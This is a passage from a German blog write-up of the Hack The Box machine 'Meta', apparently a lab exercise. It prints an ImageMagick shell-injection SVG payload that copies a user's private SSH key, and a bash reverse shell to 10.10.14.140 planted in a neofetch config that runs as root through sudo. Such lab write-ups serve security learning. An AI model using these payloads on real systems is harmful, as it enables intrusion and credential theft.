+    Laufende Prozesse und Cronjobs
+</h3>
+<p><code>pspy64</code><sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> zeigt nach einigen Minuten eine wiederkehrende Aufgabe an.</p>
+<figure><img src="/img/htb-meta-6.png">
+</figure>
+
+<p>Die wiederkehrende Aufgabe ruft <code>mogrify</code> auf und wandelt alle Dateien in <code>/var/www/dev01.artcorp.htb/convert_images/</code> in <code>.png</code>-Dateien um.</p>
+<p><code>mogrify</code> gehört zur ImageMagick-Bibliothek und die Version, die auf dem Server läuft, hat eine Shell Injection-Schwachstelle<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup>. Mithilfe des Proof-of-Concept auf der verlinkten Seite kann der private SSH-Schlüssel des Benutzers <em>Thomas</em> ausgelesen werden.</p>
+<h2 id="rechteausweitung-auf-thomas-imagemagick-exploit">
+    <a href="#rechteausweitung-auf-thomas-imagemagick-exploit" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Rechteausweitung auf thomas (ImageMagick-Exploit)
+</h2>
+<p>Um Thomas&rsquo; SSH-Schlüssel zu erhalten, muss eine Datei mit dem Namen <code>poc.svg</code> angelegt werden, die folgenden Inhalt hat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-poc.svg" data-lang="poc.svg"><span class="line"><span class="cl"><span class="nt">&lt;image</span> <span class="na">authenticate=</span><span class="s">&#39;ff&#34; `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/key`;&#34;&#39;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">&#34;pdf:/etc/passwd&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;get</span> <span class="na">width=</span><span class="s">&#34;base-width&#34;</span> <span class="na">height=</span><span class="s">&#34;base-height&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;resize</span> <span class="na">geometry=</span><span class="s">&#34;400x400&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">&#34;test.png&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;700&#34;</span> <span class="na">height=</span><span class="s">&#34;700&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span><span class="nt">&gt;</span>       
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;image</span> <span class="na">xlink:href=</span><span class="s">&#34;msl:poc.svg&#34;</span> <span class="na">height=</span><span class="s">&#34;100&#34;</span> <span class="na">width=</span><span class="s">&#34;100&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/svg&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/image&gt;</span>
+</span></span></code></pre></div><p>Diese wird anschließend in das Verzeichnis <code>/var/www/dev01.artcorp.htb/convert_images/</code> kopiert. Sobald der Cron Job ausgeführt worden ist, ist Thomas&rsquo; privater SSH-Schlüssel in der Datei <code>/dev/shm/key</code> abgespeichert und kann genutzt werden, um sich als Thomas auf dem System per SSH anzumelden und die User-Flag zu erhalten.</p>
+<h2 id="rechteausweitung-auf-root">
+    <a href="#rechteausweitung-auf-root" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Rechteausweitung auf root
+</h2>
+<p>Als erstes lohnt sich ein Blick auf die mit <code>sudo</code> ausführbaren Befehle.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">thomas@meta:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> thomas on meta:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, <span class="nv">env_keep</span><span class="o">+=</span>XDG_CONFIG_HOME
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User thomas may run the following commands on meta:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/neofetch <span class="se">\&#34;\&#34;</span>
+</span></span></code></pre></div><p>In der Ausgabe sind zwei Punkte hervorzuheben:</p>
+<ol>
+<li><code>env_keep+=XDG_CONFIG_HOME</code> bewirkt, dass die Umgebungsvariable <code>XDG_CONFIG_HOME</code> erhalten bleibt, wenn <code>sudo</code> genutzt wird.</li>
+<li><code>(root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot;</code> bedeutet, dass <code>neofetch</code> als root-Benutzer ausgeführt werden kann, ohne dass ein Kennwort eingegeben werden muss. Beim Start von <code>neofetch</code> wird eine Konfigurationsdatei unter <code>~/.config/neofetch/config.conf</code> benutzt.</li>
+</ol>
+<p>Das bedeutet, dass, wenn die Umgebungsvariable <code>XDG_CONFIG_HOME</code> auf das <code>~/.config</code>-Verzeichnis zeigt, die <code>neofetch</code>-Konfiguration als root ausgeführt wird.</p>
+<p>Um eine Reverse Shell zu erhalten, wird die Datei <code>~/.config/neofetch/config.conf</code> in der ersten Zeile wie folgt ergänzt:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.140/1337 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Rest der Datei<span class="o">]</span>
+</span></span></code></pre></div><p>Außerdem wird die Umgebungsvariable wie folgt festgelegt:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">XDG_CONFIG_HOME</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$HOME</span><span class="s2">/.config&#34;</span>
+</span></span></code></pre></div><p>Netcat-Listener nicht vergessen und <code>sudo /usr/bin/neofetch \&quot;\&quot;</code> ausführen. Es sollte eine Reverse Shell als Root geöffnet werden, mit der die Root-Flag gelesen werden kann!</p>
+<h2 id="zusammenfassung">
+    <a href="#zusammenfassung" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    Zusammenfassung
+</h2>
+<p>Die Maschine ist unter den als <em>Medium</em> eingestuften Maschinen eine der leichteren und zeigt wie wichtig eine penible Erkundung des Zielsystems ist. Die Reverse Shell zu erhalten war ein echter Kampf, da alle anderen Versuche (zig Möglichkeiten durchprobiert) nicht funktioniert haben. Die Privilege Escalation zum Benutzer <code>root</code> empfang ich als CTFig und nicht realistisch.</p>
+<p>Alles in allem eine gute und unterhaltsame Maschine und definitiv für Anfänger geeignet!</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://github.com/xenophil90/shell-scripts/blob/main/fast-nmap.sh" target="_blank" rel="noreferrer noopener">https://github.com/xenophil90/shell-scripts/blob/main/fast-nmap.sh</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://www.exiftool.org" target="_blank" rel="noreferrer noopener">https://www.exiftool.org</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/" target="_blank" rel="noreferrer noopener">https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4">
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204" target="_blank" rel="noreferrer noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:5">
+<p><a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noreferrer noopener">https://github.com/DominicBreuker/pspy</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:6">
+<p><a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" target="_blank" rel="noreferrer noopener">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+    </div>
+</div>
+
+<div class="container">
+    
+    <nav class="flex container suggested">
+        
+        
+        
+        <a rel="next" href="/posts/2022/nextcloud-23-collabora-nach-update-wieder-lauffaehig-bekommen/" title="Next post (newer)">
+            <span>Next</span>
+            Nextcloud 23 (Docker &#43; Apache 2): Collabora nach Update wieder lauffähig bekommen
+            </a> 
+        
+    </nav>
+    
+    
+</div>
+ 
+<div class="container">
+    
+</div>
+
+</main>
+
+
+        </main>
+        <footer class="footer flex">
+    <section class="container">
+        <nav class="footer-links">
+            
+            <a href="/beitraege">Alle Beiträge</a>
+            
+            <a href="/impressum">Impressum</a>
+            
+            <a href="/index.xml">RSS</a>
+            
+        </nav>
+
+        <div id="back-to-top">
+    <a href="#">
+<i class="inline-svg" type="image/svg+xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6 0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9 0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9 0L7 329.7c-9.4-9.4-9.4-24.6 0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg></i></a>
+</div>
+    </section>
+    <script defer src="/ts/features.706a523ba43e6d0427c7fdf2b9d05dbd0920d3f12942b453690b495cb2522743.js" 
+    data-enable-footnotes="true"
+    ></script>
+</footer>
+
+    </body>
+</html>
